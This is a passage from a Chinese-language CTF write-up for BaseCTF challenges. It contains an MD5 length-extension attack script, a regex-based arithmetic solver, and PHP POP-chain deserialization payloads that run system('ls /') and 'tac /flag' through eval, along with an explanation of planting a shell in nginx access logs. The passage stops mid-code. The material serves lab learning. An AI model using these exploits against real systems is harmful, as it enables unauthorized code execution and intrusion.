class="literal">None</span>:</span><br><span class="line">    <span class="comment"># (DEBUG function) verify the MD5 implementation</span></span><br><span class="line">    <span class="keyword">from</span> hashlib <span class="keyword">import</span> md5 <span class="keyword">as</span> md5_hashlib</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">md5_manual</span>(<span class="params">msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        md5 = MD5()</span><br><span class="line">        md5.extend(md5.padding(msg))</span><br><span class="line">        <span class="keyword">return</span> md5.digest()</span><br><span class="line"> </span><br><span class="line">    manual_result = md5_manual(test_string).<span class="built_in">hex</span>()</span><br><span class="line">    hashlib_result = md5_hashlib(test_string).hexdigest()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">assert</span> manual_result == hashlib_result, <span class="string">&quot;Test failed!&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">message_len: <span class="built_in">int</span>, known_hash: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">           append_str: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">    <span class="comment"># MD5 extension attack</span></span><br><span class="line">    md5 = MD5()</span><br><span class="line"> </span><br><span class="line">    previous_text = md5.padding(<span class="string">b&quot;*&quot;</span> * message_len)</span><br><span class="line">    current_text = previous_text + append_str</span><br><span class="line"> </span><br><span class="line">    md5.A, md5.B, md5.C, md5.D = unpack(<span class="string">&quot;&lt;IIII&quot;</span>, <span class="built_in">bytes</span>.fromhex(known_hash))</span><br><span class="line">    md5.extend(md5.padding(current_text)[<span class="built_in">len</span>(previous_text):])</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> current_text[message_len:], md5.digest().<span class="built_in">hex</span>()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">    message_len = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[&gt;] Input known text length: &quot;</span>))</span><br><span class="line">    known_hash = <span class="built_in">input</span>(<span class="string">&quot;[&gt;] Input known hash: &quot;</span>).strip()</span><br><span class="line">    append_text = <span class="built_in">input</span>(<span class="string">&quot;[&gt;] Input append text: &quot;</span>).strip().encode()</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Attacking...&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    extend_str, final_hash = attack(message_len, known_hash, append_text)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">    <span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Extend text:&quot;</span>, extend_str)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Extend text (URL encoded):&quot;</span>, quote(extend_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Extend text (Base64):&quot;</span>, b64encode(extend_str).decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Final hash:&quot;</span>, final_hash)</span><br></pre></td></tr></table></figure><p>按如下格式输入脚本</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731742848461-c97c6524-c90b-42f7-b0b3-536cc2ea8d8b.png" referrerpolicy="no-referrer"></p><p>将 url 后的内容贴到 name 参数里，将 hash 值贴到 md5 里就可以了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731742627366-094dd029-a4c9-43a9-aada-d52d329cc135.png" referrerpolicy="no-referrer"></p><h2 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h2><h3 id="考点：-11"><a href="#考点：-11" class="headerlink" title="考点："></a>考点：</h3><p><strong>python 的 requests 库：</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lanyinhao/p/9634742.html"><strong>参考文章</strong></a>** **</p><p><strong>正则表达式：</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dyfblog/p/5880728.html"><strong>参考文章</strong></a></p><p>这里写一下 match 和 search 的区别</p><ul><li>match</li></ul><blockquote><p>使用指定正则去待操作字符串中寻找可以匹配的子串, 返回匹配上的第一个字串，并且不再继续找，需要注意的是 match 函数是从字符串开始处开始查找的，如果开始处不匹配，则不再继续寻找，返回值为 一个 SRE_Match</p></blockquote><ul><li>search</li></ul><blockquote><p>函数类似于 match，不同之处在于不限制正则表达式的开始匹配位置</p></blockquote><h3 id="题解：-11"><a href="#题解：-11" class="headerlink" title="题解："></a>题解：</h3><p>使用 python 脚本运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://gz.imxbt.cn:20851/&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">value = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = s.post(url, &#123;<span class="string">&#x27;answer&#x27;</span>:value&#125;)</span><br><span class="line">    //猜测flag没有被编码，直接用BaseCTF匹配</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;BaseCTF&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    //使用正则表达式匹配数学公式，并利用括号分组</span><br><span class="line">    expression = re.search(<span class="string">r&#x27;(\d+)(.)(\d+)&#x27;</span>,r.text)</span><br><span class="line">    //group(<span class="number">2</span>)就是匹配得到的运算符</span><br><span class="line">    <span class="keyword">if</span> expression.group(<span class="number">2</span>) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        value = <span class="built_in">int</span>(expression.group(<span class="number">1</span>)) + <span class="built_in">int</span>(expression.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">if</span> expression.group(<span class="number">2</span>) == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        value = <span class="built_in">int</span>(expression.group(<span class="number">1</span>)) - <span class="built_in">int</span>(expression.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">if</span> expression.group(<span class="number">2</span>) == <span class="string">&#x27;×&#x27;</span>:</span><br><span class="line">        value = <span class="built_in">int</span>(expression.group(<span class="number">1</span>)) * <span class="built_in">int</span>(expression.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">if</span> expression.group(<span class="number">2</span>) == <span class="string">&#x27;÷&#x27;</span>:</span><br><span class="line">        value = <span class="built_in">int</span>(expression.group(<span class="number">1</span>)) / <span class="built_in">int</span>(expression.group(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>补充：</p><p>像这种算术题，如果乘和除用的是’ * ‘ 和 ‘ &#x2F; ‘ 那么我们可以直接匹配整个句子（不分组）</p><p>再利用 python 的 eval（）函数，直接执行这个句子得到结果。</p><p>结果</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731249827760-64a8ba4d-07fc-44f0-887a-e11fc64b3311.png" referrerpolicy="no-referrer"></p><h2 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h2><h3 id="考点：-12"><a href="#考点：-12" class="headerlink" title="考点："></a>考点：</h3><p><strong>pop 链构造</strong></p><p><strong>php 私有属性修改内容</strong></p><ul><li>方法一：</li></ul><blockquote><p>在类内规定新创建一个 public 方法来更改私有属性或者使用 __construct() 方法在创建对象时，直接修改私有属性</p></blockquote><ul><li>方法二：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangyuming/p/7447837.html">参考文章</a></li></ul><blockquote><p>通过使用 PHP 的反射机制访问和修改类的私有属性：</p></blockquote><h3 id="题解：-12"><a href="#题解：-12" class="headerlink" title="题解："></a>题解：</h3><p>进入题目，得源码加注释后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 输出当前文件的源代码，用于调试或展示代码结构</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sink类定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 私有属性，初始设置了一个要执行的命令字符串，这里初始是简单的输出123</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当对象被当作字符串使用时会自动调用此方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 使用eval函数执行存储在$cmd属性中的命令字符串</span></span><br><span class="line">        <span class="comment">// 这里存在安全风险，如果能控制$cmd的值，就可执行任意PHP代码</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Shark类定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 私有属性，存储了一个字符串</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当对象被当作函数调用时会自动调用此方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 输出一段包含$word属性值的字符串</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span>. <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sea类定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 公共属性，用于存储一个对象（可能是具有可调用行为的对象，如实现了__invoke方法的对象）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当访问不存在的属性时会自动调用此方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 获取$animal属性的值，这里假设它是一个可调用的对象</span></span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="comment">// 输出一段描述性字符串，包含调用$sea_ani对象（当作函数调用）的结果</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span>. <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Nature类定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 公共属性，用于存储一个Sea类的对象（或其他相关对象）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当对象被销毁时会自动调用此方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 尝试输出$sea对象的see属性的值</span></span><br><span class="line">        <span class="comment">// 这里可能存在问题，如果$sea对象没有see属性，会产生错误</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否有通过POST方式提交的名为&#x27;nature&#x27;的数据</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="comment">// 对提交的名为&#x27;nature&#x27;的数据进行反序列化操作</span></span><br><span class="line">    <span class="comment">// 如果用户能控制此数据，可能通过构造恶意序列化数据来利用代码中的漏洞</span></span><br><span class="line">    <span class="comment">// 比如控制Sink类中的$cmd属性值来执行恶意代码等</span></span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>大体思路:</strong></p><p><strong>反序列化-&gt;Nature 类的 __destruct() 函数 [ 访问未定义的变量 ]-&gt;Sea 类的 __get（）函数 [ 对象被当作函数调用 ] -&gt; Shark 类的 __invoke()函数 [ 字符串拼接 ]-&gt;Sink 类的 __toString() 函数 [ 调用 eval（）函数 ]</strong></p><p><strong>方法一：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setword</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;word = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if ($_POST[&#x27;nature&#x27;]) &#123;</span></span><br><span class="line"><span class="comment">//    $nature = unserialize($_POST[&#x27;nature&#x27;]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$nature</span> = <span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="variable">$sea</span> = <span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line"><span class="variable">$shark</span> = <span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="variable">$sink</span> = <span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sea</span>-&gt;animal = <span class="variable">$shark</span>;</span><br><span class="line"><span class="variable">$nature</span>-&gt;sea = <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shark</span>-&gt;<span class="title function_ invoke__">setword</span>(<span class="variable">$sink</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;nature=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nature</span>));</span><br></pre></td></tr></table></figure><p><strong>方法二：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sink</span></span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = <span class="string">&#x27;system(&quot;tac /flag&quot;);&#x27;</span>;</span><br><span class="line">    public function __toString() // 当对象被当做字符串时自动调用（找echo $this-&gt;a这种、strtolower()等）</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>($this-&gt;cmd);  // <span class="number">1</span> system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shark</span></span><br><span class="line">&#123;</span><br><span class="line">    private $word;</span><br><span class="line">    public function __invoke()  // 对象被当做函数进行调用时触发（找有括号的类似$a()这种）</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&#x27;Shark says: &#x27;</span> . $this-&gt;word;  // <span class="number">2</span> Sink</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sea</span></span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">    public function __get($name)  // 调用类中不存在变量时触发（找有连续箭头的 this-&gt;a-&gt;b）</span><br><span class="line">    &#123;</span><br><span class="line">        $sea_ani = $this-&gt;animal;</span><br><span class="line">        echo <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . $sea_ani();  // <span class="number">3</span> Shark</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Nature</span></span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line"> </span><br><span class="line">    public function __destruct()  // 对象被销毁时自动触发，也就是我们的链头了</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sea-&gt;see;  // <span class="number">4</span> Sea</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// 按照 <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> 的顺序编写 pop</span><br><span class="line">$s1 = new Sink();</span><br><span class="line">$s2 = new Shark();</span><br><span class="line"></span><br><span class="line">// 创建一个反射对象</span><br><span class="line">$reflection = new ReflectionClass($s2);</span><br><span class="line">// 通过反射获取指定名称为<span class="string">&#x27;word&#x27;</span>的属性对象</span><br><span class="line">$<span class="built_in">property</span> = $reflection-&gt;getProperty(<span class="string">&#x27;word&#x27;</span>); </span><br><span class="line"></span><br><span class="line">// 设置该属性为可访问状态，这一步通常在属性是私有或受保护的情况下是必要的</span><br><span class="line">// 这样后续才能对其进行取值或赋值等操作</span><br><span class="line">$<span class="built_in">property</span>-&gt;setAccessible(true); </span><br><span class="line"></span><br><span class="line">// 将变量 $s1 的值设置给对象 $s2 的<span class="string">&#x27;word&#x27;</span>属性</span><br><span class="line">// 这里假设 $s2 是拥有<span class="string">&#x27;word&#x27;</span>属性的对象实例，$s1 是要赋给该属性的值</span><br><span class="line">$<span class="built_in">property</span>-&gt;setValue($s2, $s1); </span><br><span class="line"> </span><br><span class="line">$s3 = new Sea();</span><br><span class="line">$s3-&gt;animal = $s2;</span><br><span class="line">$n = new Nature();</span><br><span class="line">$n-&gt;sea = $s3;</span><br><span class="line"> </span><br><span class="line">echo <span class="string">&#x27;nature=&#x27;</span>.urlencode(serialize($n));</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目中提示了 hackbar 没有回显，这里使用 burp 传参</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731736430881-8a460663-f6d6-4cf2-b1c5-34e1618655a2.png" referrerpolicy="no-referrer"></p><p>得到列表，接下来 cat 内容。结束</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731736513061-9c66f40c-5ce4-45b4-a85e-7c32278b51e4.png" referrerpolicy="no-referrer"></p><h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h2><h3 id="考点：-13"><a href="#考点：-13" class="headerlink" title="考点："></a>考点：</h3><p><strong>nginx 访问日志写入 shell</strong></p><p>首先了解什么是 nginx，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wcwnina/p/8728391.html">参考文章</a></p><p>nginx 和 apache 都是 web 服务器，而这两个服务器在运行时服务器下肯定有预先设置好的各种日志文件，进而可以利用这些日志文件写入 shell ，从而获取 flag</p><p>对于 nginx 而言，</p><ul><li>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log： error.log可以配置成任意级别，默认级别是error，用来记录Nginx运行期的处理流程相关的信息。</li><li>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log： access.log指的是访问日志，用来记录服务器的接入信息（包括记录用户的IP、请求处理时间、浏览器信息等）。</li></ul><p>对于 apach 而言，</p><ul><li>&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log :与 nginx 的 access.log 类似。</li></ul><p>总之，可以利用这些日志文件，在里面写入 shell，从而获取 flag。</p><h3 id="题解：-13"><a href="#题解：-13" class="headerlink" title="题解："></a>题解：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 开启语法高亮显示当前文件的代码，方便查看代码结构及语法（通常在调试或展示代码时使用）</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span 